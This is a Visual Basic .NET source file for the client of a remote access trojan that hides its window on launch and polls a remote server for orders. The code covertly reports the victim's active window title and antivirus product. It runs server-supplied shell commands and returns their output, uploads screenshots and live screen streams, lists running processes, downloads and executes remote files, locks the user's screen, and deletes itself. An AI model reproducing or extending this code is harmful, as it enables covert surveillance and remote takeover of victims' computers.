Imports System.Text
Imports System.Net
Imports System.Threading
Imports System.Net.NetworkInformation
Imports System.IO
Imports System.Management

''' <summary>
''' TODO: Add mutex
''' </summary>

Public Class MainForm
    Private Declare Function GetForegroundWindow Lib "user32" Alias "GetForegroundWindow" () As IntPtr
    Private Declare Auto Function GetWindowText Lib "user32" (ByVal hWnd As System.IntPtr, ByVal lpString As System.Text.StringBuilder, ByVal cch As Integer) As Integer
    'Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal Command As String, ByVal ReturnString As String, ByVal ReturnLength As Long, ByVal hWnd As Long) As Long
    Public Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As UInt32, ByVal hwndCallback As IntPtr) As UInt32
    Public mainWebClient As WebClient = New WebClient()
    Public upTime As Integer = 0
    Private Function GetCaption() As String
        Dim Caption As New StringBuilder(256)
        Dim hWnd As IntPtr = GetForegroundWindow()
        GetWindowText(hWnd, Caption, Caption.Capacity)
        Return Caption.ToString()
    End Function
    Public Shared Function GetAntivirus() As String
        Try
            Dim Name As String = String.Empty
            Dim WinDefend As Boolean = False
            Dim Path As String = "\\" & Environment.MachineName & "\root\SecurityCenter2"

            Using MOS As ManagementObjectSearcher = New ManagementObjectSearcher(Path, "SELECT * FROM AntivirusProduct")

                For Each Instance In MOS.[Get]()
                    If Instance.GetPropertyValue("displayName").ToString() = "Windows Defender" Then WinDefend = True
                    If Instance.GetPropertyValue("displayName").ToString() <> "Windows Defender" Then Name = Instance.GetPropertyValue("displayName").ToString()
                Next

                If Name = String.Empty AndAlso WinDefend Then Name = "Windows Defender"
                If Name = "" Then Name = "N/A"
                Return Name
            End Using

        Catch
            Return "N/A"
        End Try
    End Function
    Public Function GetGBRamAmount() As String
        Return Convert.ToInt32(My.Computer.Info.AvailablePhysicalMemory / My.Computer.Info.TotalPhysicalMemory).ToString("p")
    End Function
    Public Function GetPing() As Integer
        Dim latency As String = ""

        Try
            Dim address As IPAddress = Dns.GetHostAddresses(New Uri(My.Settings.vpsurl & "clients.php?action=writeme").Host)(0)
            latency = New Ping().Send(address).RoundtripTime.ToString()
        Catch Ex As Exception
            latency = "Unknown Error"
        End Try

        Return latency
    End Function
    Public Function GetExeName() As String
        Dim exename As String
        exename = AppDomain.CurrentDomain.FriendlyName
        Return exename
    End Function
    Public Function ShellRun(sCmd As String) As String
        Dim oShell As Object = CreateObject("WScript.Shell")

        Dim oExec As Object = oShell.Exec(sCmd)
        Dim oOutput As Object = oExec.StdOut
        Dim s As String = ""
        Dim sLine As String = ""

        While Not oOutput.AtEndOfStream
            sLine = oOutput.ReadLine
            If sLine <> "" Then s &= sLine & vbCrLf
        End While

        Return s
    End Function
    Public Function APIRequest() As String
        Dim cpuCounter As PerformanceCounter = New PerformanceCounter("Processor", "% Processor Time", "_Total")
        Dim GetCPU As String = String.Format("{0:f0}", Convert.ToSingle(cpuCounter.NextValue()))

        Dim apiResponse As String = New WebClient().DownloadString(My.Settings.vpsurl &
        "clients.php?action=writeme&ping=" & GetPing() &
        "&ram=" & GetGBRamAmount() &
        "&cpu=" & GetCPU &
        "&currentwindow=" & GetCaption() &
        "&uptime=" & upTime &
        "&softwarename=" & GetExeName() &
        "&avname=" & GetAntivirus()
        )

        upTime += 1
        Return apiResponse
    End Function

    Private Sub loopOpenCD(repeatAmount As Integer)
        For i = 1 To repeatAmount
            Try
                mciSendString("set cdaudio door open", 0, 0, 0)
                mciSendString("set cdaudio door closed", 0, 0, 0)
            Catch ex As Exception
                Exit For
            End Try
        Next
    End Sub
    Private Sub mainBW_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles mainBW.DoWork
        While True
            Dim apiQuery As String = APIRequest()
            If apiQuery.Trim <> "" Then
                Dim parsedResponse As String() = apiQuery.Split("|")
                Dim actionType As String = parsedResponse(0)
                Dim actionContent As String() = parsedResponse.Skip(1).ToArray
                parseAction(actionType, actionContent)
            End If
            Thread.Sleep(500)
        End While
    End Sub

    Public Sub MainForm_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        'My.Settings.bl = False
        'My.Settings.blmsg = ""
        'My.Settings.Save()

        If My.Settings.bl Then
            If My.Settings.blmsg.Trim <> "" Then
                MsgBox(My.Settings.blmsg,, "")
            End If
            Environment.Exit(0)
        End If

        ' EOF arguments parsing |
        '                       v

        ' FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read)
        ' Dim Data As String = Space(LOF(1))
        ' FileGet(1, Data)
        ' FileClose(1)

        CheckForIllegalCrossThreadCalls = False
        mainBW.RunWorkerAsync()
        Me.Opacity = 0
        Me.Hide()
    End Sub

    Private Sub parseAction(actionType As String, actionContent As String())
        If actionType = "camerashot" Then
            ' Dim cap As New Capture() 'first line
            ' cap.Dispose()

            ' Dim client As New WebClient
            ' client.UploadData(My.Settings.vpsurl & "clients.php?action=uploadscreenshot&actioncontent=test.jpeg", cap.QueryFrame.ToImage)

        ElseIf actionType = "screenshare" Then
            If Screenshare.screenshareBW Is Nothing Then
                Screenshare.InitFluxManager()
            End If

            If actionContent(0) = "start" Then
                Screenshare.screenshareQuality = actionContent(1)
                Screenshare.screenshareFluxInterval = Convert.ToInt32(actionContent(2))

                If Not Screenshare.screenshareBW.IsBusy Then
                    Screenshare.screenshareBW.RunWorkerAsync()
                End If
            Else
                Screenshare.screenshareBW.CancelAsync()
            End If


        ElseIf actionType = "screenshot" Then
            Dim screenGrab As Bitmap = Screenshare.TakeBitmapScreenshot()
            Dim bmpBytes As Byte() = Screenshare.ResizeConvertBMP(screenGrab, 75L)
            mainWebClient.UploadData(My.Settings.vpsurl & "clients.php?action=uploadscreenshot&actioncontent=" + actionContent(0), bmpBytes)

        ElseIf actionType = "runwincmd" Then
            Dim shellReply As String
            shellReply = Convert.ToBase64String(Encoding.UTF8.GetBytes(ShellRun("cmd.exe /c " & actionContent(0))))
            mainWebClient.UploadString(My.Settings.vpsurl, "clients.php?action=sendshellreply&actioncontent=" & shellReply)

        ElseIf actionType = "shutdownrat" Then
            Environment.Exit(0)

        ElseIf actionType = "rebootrat" Then
            Process.Start(Application.ExecutablePath)
            Environment.Exit(0)

        ElseIf actionType = "uninstallrat" Then
            Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 1 & Del " + Application.ExecutablePath)
            Environment.Exit(0)

        ElseIf actionType = "openURL" Then
            Try
                Process.Start(actionContent(0))
            Catch ex As System.ComponentModel.Win32Exception
                Exit Sub
            End Try

        ElseIf actionType = "msgbox" Then
            MsgBox(actionContent(0),, "")

        ElseIf actionType = "cdopen" Then
            Dim mciLoopThread As New Thread(Sub() loopOpenCD(Convert.ToInt32(actionContent(0))))
            mciLoopThread.Start()


        ElseIf actionType = "openremotechat" Then
            Invoke(Sub() RemoteChat.Show())

        ElseIf actionType = "userblacklist" Then
            My.Settings.bl = True
            'TODO: Is the blacklist message really useful ?
            My.Settings.blmsg = actionContent(0)
            My.Settings.Save()
            Environment.Exit(0)

        ElseIf actionType = "closeremotechat" Then
            Invoke(Sub() RemoteChat.Hide())


            'ElseIf actionType = "raisePerm" Then
            '   Dim raiseperm As New Process()
            '         New raiseperm() With { .StartInfo = { .FileName = Application.ExecutablePath, .UseShellExecute = True, .Verb = "runas"} }.Start()
            '        Try
            '     Process.GetCurrentProcess().Kill()
            'Catch
            '    Environment.[Exit](0)
            'End Try

        ElseIf actionType = "camerashare" Then
            ' TODO : camera share
        ElseIf actionType = "lockuser" Then
            Invoke(Sub() LockedWindow.Show())

        ElseIf actionType = "unlockuser" Then
            Invoke(Sub() LockedWindow.Hide())

        ElseIf actionType = "getruningtasks" Then
            Dim total As String = ""
            For Each p As Process In Process.GetProcesses
                total += p.Id & "|"
                total += p.ProcessName & "|"
                total += p.MainWindowTitle & "|"
                total += (p.WorkingSet64 / 1024) / 1024 & "[;;]"
            Next
            mainWebClient.DownloadString(My.Settings.vpsurl & "clients.php?action=sendtasks&actioncontent=" & total)

        ElseIf actionType = "playmp3" Then
            ' TODO : check this feature
            Dim filename As String = actionContent(0)
            MsgBox(actionContent(0))
            mainWebClient.DownloadFile(My.Settings.vpsurl & "files/" & filename, filename)
            File.Move(filename, Path.GetTempPath & filename)


        ElseIf actionType = "remotexec" Then
            Dim filename As String = actionContent(0)
            Dim client As New WebClient
            client.DownloadFile(My.Settings.vpsurl & "/files/" & filename, filename)
            Try
                File.Move(filename, Path.GetTempPath & filename)
                File.Delete(filename)
            Catch
            End Try
            Process.Start(Path.GetTempPath & filename)
        End If


    End Sub
End Class